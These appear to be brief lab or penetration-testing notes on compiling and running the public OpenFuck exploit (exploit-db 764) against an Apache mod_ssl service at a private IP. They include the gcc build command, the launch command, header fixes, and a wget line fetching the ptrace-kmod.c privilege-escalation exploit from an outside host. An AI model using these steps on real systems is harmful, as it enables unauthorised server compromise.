Compile command:

gcc -o OpenF ./openfuck.c -lcrypto

Use command:

./OpenF 0x73 192.168.15.222 443


Original Exploit Location:

https://www.exploit-db.com/exploits/764/

Changes from original:

"#include < openssl/rc4 DOT h >"
"#include < openssl/md5 DOT >"

Add "const" to line 961:

const unsigned char *p, *end;

This the following wget command fails, but non-root (apache) access is still achievable

wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c


